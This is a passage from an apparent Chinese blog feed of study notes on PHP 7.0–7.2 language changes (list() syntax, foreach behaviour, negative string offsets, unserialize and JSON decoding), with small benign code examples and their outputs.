&quot;NONEXISTENT&quot;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="新的对象类型-¶"><a href="#新的对象类型-¶" class="headerlink" title="新的对象类型 ¶"></a>新的对象类型<a href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.object-type"> ¶</a></h2><h2 id="通过名称加载扩展-¶"><a href="#通过名称加载扩展-¶" class="headerlink" title="通过名称加载扩展 ¶"></a>通过名称加载扩展<a href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.ext-loading-by-name"> ¶</a></h2><h2 id="扩展了参数类型-¶"><a href="#扩展了参数类型-¶" class="headerlink" title="扩展了参数类型 ¶"></a>扩展了参数类型<a href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.param-type-widening"> ¶</a></h2><h2 id="Disallow-passing-NULL-to-get-class-¶"><a href="#Disallow-passing-NULL-to-get-class-¶" class="headerlink" title="Disallow passing NULL to get_class() ¶"></a>Disallow passing <strong>NULL</strong> to <a href="https://www.php.net/manual/zh/function.get-class.php">get_class()</a><a href="https://www.php.net/manual/zh/migration72.incompatible.php#migration72.incompatible.no-null-to-get_class"> ¶</a></h2>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP7.1特性</title>
    <link href="/2024/08/31/PHP7-1%E7%89%B9%E6%80%A7/"/>
    <url>/2024/08/31/PHP7-1%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP7-1函数相关变更"><a href="#PHP7-1函数相关变更" class="headerlink" title="PHP7.1函数相关变更"></a>PHP7.1函数相关变更</h1><h2 id="list-现在支持键名"><a href="#list-现在支持键名" class="headerlink" title="list()现在支持键名"></a>list()现在支持键名</h2><p>现在<code>list()</code>和它的新的*[]*语法支持在它内部去指定键名。这意味着它可以将任意类型的数组 都赋值给一些变量（与短数组语法类似）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<br>    [<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&#x27;Tom&#x27;</span>],<br>    [<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&#x27;Fred&#x27;</span>],<br>];<br><br><span class="hljs-comment">// list() style</span><br><span class="hljs-keyword">list</span>(<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id1</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name1</span>) = <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// [] style</span><br>[<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id1</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name1</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// list() style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">list</span>(<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name</span>)) &#123;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br><br><span class="hljs-comment">// [] style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> [<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name</span>]) &#123;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="禁止动态调用的函数"><a href="#禁止动态调用的函数" class="headerlink" title="禁止动态调用的函数"></a>禁止动态调用的函数</h2><p>如下：</p><ul><li><a href="https://www.php.net/manual/zh/function.assert.php">assert()</a> - with a string as the first argument</li><li><a href="https://www.php.net/manual/zh/function.compact.php">compact()</a></li><li><a href="https://www.php.net/manual/zh/function.extract.php">extract()</a></li><li><a href="https://www.php.net/manual/zh/function.func-get-args.php">func_get_args()</a></li><li><a href="https://www.php.net/manual/zh/function.func-get-arg.php">func_get_arg()</a></li><li><a href="https://www.php.net/manual/zh/function.func-num-args.php">func_num_args()</a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-vars.php">get_defined_vars()</a></li><li><a href="https://www.php.net/manual/zh/function.mb-parse-str.php">mb_parse_str()</a> - with one arg</li><li><a href="https://www.php.net/manual/zh/function.parse-str.php">parse_str()</a> - with one arg</li></ul><p>尾随的<code>-</code>代表禁止动态调用的条件。<code>func_get_args</code>等几个函数测试了下好像并没有禁止动态调用？不太懂。</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>对<code>allowed_classes</code>参数严格化，如果对其传入的值是<strong>布尔值</strong>和<strong>数组</strong>之外的内容，<code>unserialize</code>将返回<strong>False</strong>和<strong>E_WARNING</strong></p><h2 id="getenv可以不需要传入参数"><a href="#getenv可以不需要传入参数" class="headerlink" title="getenv可以不需要传入参数"></a>getenv可以不需要传入参数</h2><p><code>getenv()</code> 可以不传入任何参数。 如果不传入参数，此函数会以关联数组的形式 返回所有的环境变量。</p><p><img src="C:\Users\a1348\Desktop\WebBook-master\WebBook-master\images\19-10-1_PHP_PHP71函数相关变更_2.png"></p><h2 id="parse-url支持RFC3986"><a href="#parse-url支持RFC3986" class="headerlink" title="parse_url支持RFC3986"></a>parse_url支持RFC3986</h2><p><code>parse_url()</code> 更加严格的限制， 并且提供对 RFC3986 的支持。</p><h2 id="session-start将返回false"><a href="#session-start将返回false" class="headerlink" title="session_start将返回false"></a>session_start将返回false</h2><p><code>session_start()</code> 当无法成功初始化会话的时候，返回 <strong>FALSE</strong>， 并且不会初始化超级变量 <code>$_SESSION</code>。</p><p>但是我测试的时候发现，PHP7.0已经会返回False了（Win+PHP7.12nts</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">session_start</span>(<span class="hljs-string">&#x27;11&#x27;</span>));<br>@<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">php5</span><br><span class="hljs-comment">bool(true)</span><br><span class="hljs-comment">array(0) &#123;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PHP5</span><br><span class="hljs-comment">bool(false)</span><br><span class="hljs-comment">NULL</span><br></code></pre></td></tr></table></figure><h2 id="（废弃）两个函数的Eval选项"><a href="#（废弃）两个函数的Eval选项" class="headerlink" title="（废弃）两个函数的Eval选项"></a>（废弃）两个函数的Eval选项</h2><p><a href="https://www.php.net/manual/zh/function.mb-ereg-replace.php">mb_ereg_replace()</a>和<a href="https://www.php.net/manual/zh/function.mb-eregi-replace.php">mb_eregi_replace()</a></p><h2 id="（废弃）ext-mcrypt"><a href="#（废弃）ext-mcrypt" class="headerlink" title="（废弃）ext&#x2F;mcrypt"></a>（废弃）ext&#x2F;mcrypt</h2><h1 id="PHP7-1语法相关的变更"><a href="#PHP7-1语法相关的变更" class="headerlink" title="PHP7.1语法相关的变更"></a>PHP7.1语法相关的变更</h1><h2 id="增加）短数组"><a href="#增加）短数组" class="headerlink" title="(增加）短数组"></a>(增加）短数组</h2><p>短数组语法<code>[]</code>现在作为<code>list()</code>语法的一个备选项，可以用于将数组的值赋给一些变量（包括在<em>foreach</em>中）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<br>    [<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;Tom&#x27;</span>],<br>    [<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;Fred&#x27;</span>],<br>];<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$data</span>);<br><br><span class="hljs-comment">// list() style</span><br><br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$id1</span>, <span class="hljs-variable">$name1</span>) = <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// [] style</span><br><span class="hljs-comment">#[$id1, $name1] = $data[0];</span><br><br><span class="hljs-comment">// list() style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">list</span>(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$name</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$id</span> <span class="hljs-subst">$name</span>\n&quot;</span>;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br><br><span class="hljs-comment">// [] style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> [<span class="hljs-variable">$id</span>, <span class="hljs-variable">$name</span>]) &#123;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="（增加）支持为负的字符串偏移量"><a href="#（增加）支持为负的字符串偏移量" class="headerlink" title="（增加）支持为负的字符串偏移量"></a>（增加）支持为负的字符串偏移量</h2><p>现在所有支持偏移量的<a href="https://www.php.net/manual/zh/book.strings.php">字符串操作函数</a> 都支持接受负数作为偏移量，包括通过<code>[]</code>或<code>&#123;&#125;</code>操作<a href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.substr">字符串下标</a>。在这种情况下，一个负数的偏移量会被理解为一个从字符串结尾开始的偏移量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;abcdef&quot;</span>[-<span class="hljs-number">2</span>]); <span class="hljs-comment">// string (1) &quot;e&quot;</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;aabbcc&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, -<span class="hljs-number">3</span>));  <span class="hljs-comment">// int(3)</span><br></code></pre></td></tr></table></figure><p>字符串也同样支持</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;bar&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The last character of &#x27;<span class="hljs-subst">$string</span>&#x27; is &#x27;<span class="hljs-subst">$string</span>[-1]&#x27;.\n&quot;</span>;<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">The last character of &#x27;bar&#x27; is &#x27;r&#x27;.</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="（增加）当传递参数过少时将抛出错误"><a href="#（增加）当传递参数过少时将抛出错误" class="headerlink" title="（增加）当传递参数过少时将抛出错误"></a>（增加）当传递参数过少时将抛出错误</h2><p>在过去如果我们调用一个用户定义的函数时，提供的参数不足，那么将会产生一个警告(warning)。 现在，这个警告被提升为一个错误异常(Error exception)，意味着PHP会中断执行。这个变更仅对用户定义的函数生效， 并不包含内置函数。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$param</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1\n&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">system</span>();<br><span class="hljs-title function_ invoke__">test</span>();<br></code></pre></td></tr></table></figure><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-10-2_PHP_PHP71%E8%AF%AD%E6%B3%95%E7%9B%B8%E5%85%B3%E5%8F%98%E6%9B%B4_1.png"></p><h2 id="引用数组元素创建元素的顺序更改"><a href="#引用数组元素创建元素的顺序更改" class="headerlink" title="引用数组元素创建元素的顺序更改"></a>引用数组元素创建元素的顺序更改</h2><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sml">&lt;?php<br>$<span class="hljs-built_in">array</span> = <span class="hljs-literal">[]</span>;<br>$<span class="hljs-built_in">array</span>[<span class="hljs-string">&quot;a&quot;</span>] =&amp; $<span class="hljs-built_in">array</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>$<span class="hljs-built_in">array</span>[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">1</span>;<br>var_dump($<span class="hljs-built_in">array</span>);<br><br># 结果<br>/*<br><span class="hljs-type">PHP7</span>.<span class="hljs-number">0</span><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-type">PHP7</span>.<span class="hljs-number">1</span><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br>*/<br></code></pre></td></tr></table></figure><h2 id="JSON编码和解码"><a href="#JSON编码和解码" class="headerlink" title="JSON编码和解码"></a>JSON编码和解码</h2><p>解码一个空键值将会解析为一个空属性名，而之前会解析为<code>_empty_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;&#x27;</span> =&gt; <span class="hljs-number">1</span>])));<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">PHP&lt;7.1</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [&quot;_empty_&quot;]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PHP7.1</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [&quot;&quot;]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="可为空（Nullable）类型-¶"><a href="#可为空（Nullable）类型-¶" class="headerlink" title="可为空（Nullable）类型 ¶"></a>可为空（Nullable）类型<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.nullable-types"> ¶</a></h2><h2 id="Void-函数-¶"><a href="#Void-函数-¶" class="headerlink" title="Void 函数 ¶"></a>Void 函数<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.void-functions"> ¶</a></h2><h2 id="类常量可见性-¶"><a href="#类常量可见性-¶" class="headerlink" title="类常量可见性 ¶"></a>类常量可见性<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.class-constant-visibility"> ¶</a></h2><h2 id="iterable-伪类-¶"><a href="#iterable-伪类-¶" class="headerlink" title="iterable 伪类 ¶"></a><a href="https://www.php.net/manual/zh/language.types.iterable.php">iterable</a> 伪类<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.iterable-pseudo-type"> ¶</a></h2><h2 id="多异常捕获处理-¶"><a href="#多异常捕获处理-¶" class="headerlink" title="多异常捕获处理 ¶"></a>多异常捕获处理<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.mulit-catch-exception-handling"> ¶</a></h2><h2 id="Invalid-class-interface-and-trait-names-¶"><a href="#Invalid-class-interface-and-trait-names-¶" class="headerlink" title="Invalid class, interface, and trait names ¶"></a>Invalid class, interface, and trait names<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.invalid-class-names"> ¶</a></h2><h2 id="Numerical-string-conversions-now-respect-scientific-notation-¶"><a href="#Numerical-string-conversions-now-respect-scientific-notation-¶" class="headerlink" title="Numerical string conversions now respect scientific notation ¶"></a>Numerical string conversions now respect scientific notation<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.numerical-strings-scientific-notation"> ¶</a></h2><h2 id="Fixes-to-mt-rand-algorithm-¶"><a href="#Fixes-to-mt-rand-algorithm-¶" class="headerlink" title="Fixes to mt_rand() algorithm ¶"></a>Fixes to <a href="https://www.php.net/manual/zh/function.mt-rand.php">mt_rand()</a> algorithm<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.fixes-to-mt_rand-algorithm"> ¶</a></h2><h2 id="rand-aliased-to-mt-rand-and-srand-aliased-to-mt-srand-¶"><a href="#rand-aliased-to-mt-rand-and-srand-aliased-to-mt-srand-¶" class="headerlink" title="rand() aliased to mt_rand() and srand() aliased to mt_srand() ¶"></a><a href="https://www.php.net/manual/zh/function.rand.php">rand()</a> aliased to <a href="https://www.php.net/manual/zh/function.mt-rand.php">mt_rand()</a> and <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> aliased to <a href="https://www.php.net/manual/zh/function.mt-srand.php">mt_srand()</a> <a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.rand-srand-aliases">¶</a></h2><h2 id="Disallow-the-ASCII-delete-control-character-in-identifiers-¶"><a href="#Disallow-the-ASCII-delete-control-character-in-identifiers-¶" class="headerlink" title="Disallow the ASCII delete control character in identifiers ¶"></a>Disallow the ASCII delete control character in identifiers<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.delete-control-character-in-identifiers"> ¶</a></h2><h2 id="在不完整的对象上不再调用析构方法-¶"><a href="#在不完整的对象上不再调用析构方法-¶" class="headerlink" title="在不完整的对象上不再调用析构方法 ¶"></a>在不完整的对象上不再调用析构方法<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.dont-call-destructors"> ¶</a></h2><h2 id="call-user-func-不再支持对传址的函数的调用-¶"><a href="#call-user-func-不再支持对传址的函数的调用-¶" class="headerlink" title="call_user_func()不再支持对传址的函数的调用 ¶"></a><a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func()</a>不再支持对传址的函数的调用 <a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.call_user_func-with-ref-args">¶</a></h2><h2 id="ini配置项移除-¶"><a href="#ini配置项移除-¶" class="headerlink" title="ini配置项移除 ¶"></a>ini配置项移除<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.removed-ini-directives"> ¶</a></h2><h2 id="Sort-order-of-equal-elements"><a href="#Sort-order-of-equal-elements" class="headerlink" title="Sort order of equal elements"></a>Sort order of equal elements</h2><h2 id="Lexically-bound-variables-cannot-reuse-names-¶"><a href="#Lexically-bound-variables-cannot-reuse-names-¶" class="headerlink" title="Lexically bound variables cannot reuse names ¶"></a>Lexically bound variables cannot reuse names<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.lexical-names"> ¶</a></h2>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP7.0特性</title>
    <link href="/2024/08/31/PHP7-0%E7%89%B9%E6%80%A7/"/>
    <url>/2024/08/31/PHP7-0%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="函数变更"><a href="#函数变更" class="headerlink" title="函数变更"></a>函数变更</h1><p>参考：</p><ul><li><a href="https://www.php.net/manual/zh/appendices.php">https://www.php.net/manual/zh/appendices.php</a></li><li><a href="http://xiaoze.club/">http://xiaoze.club/</a></li></ul><h2 id="关于list处理方式的变更"><a href="#关于list处理方式的变更" class="headerlink" title="关于list处理方式的变更"></a>关于list处理方式的变更</h2><p><strong>list不再以反向的顺序来进行赋值</strong></p><p><code>list</code>现在会按照变量定义的顺序来给他们进行赋值，而非反过来的顺序。 通常来说，这只会影响<code>list</code>与数组的<code>[]</code>操作符一起使用的案例，如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$a</span>[], <span class="hljs-variable">$a</span>[], <span class="hljs-variable">$a</span>[]) = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP5<br><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">3</span>)<br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br><br>PHP7<br><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">3</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>推荐不要依赖l<code>ist</code>的赋值顺序，因为这是一个在未来也许会变更的实现细节。</p><p><strong>list 结构现在不再能是空的</strong></p><p>list结构现在不再能是空的。如下的例子不再被允许：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">list</span>() = <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">list</span>(,,) = <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">list</span>(<span class="hljs-variable">$x</span>, <span class="hljs-keyword">list</span>(), <span class="hljs-variable">$y</span>) = <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$x</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>list不再能解开string</strong></p><p><code>list</code>不再能解开字符串（string）变量。 你可以使用<code>str_split</code>来代替它</p><h2 id="foreach的变化"><a href="#foreach的变化" class="headerlink" title="foreach的变化"></a>foreach的变化</h2><p><code>foreach</code>发生了细微的变化，控制结构， 主要围绕阵列的内部数组指针和迭代处理的修改。</p><p><strong>foreach不再改变内部数组指针</strong></p><p>在PHP7之前，当数组通过<code>foreach</code>迭代时，数组指针会移动。现在开始，不再如此，见下面代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> &amp;<span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-variable">$array</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP5<br><span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">bool</span>(<span class="hljs-literal">false</span>)<br>    <br>PHP7<br><span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><strong>foreach通过值遍历时，操作的值为数组的副本</strong></p><p>当默认使用通过值遍历数组时，<code>foreach</code>实际操作的是数组的迭代副本，而非数组本身。这就意味着，<code>foreach</code> 中的操作不会修改原数组的值。</p><p><strong>foreach通过引用遍历时，有更好的迭代特性</strong></p><p>当使用引用遍历数组时，现在 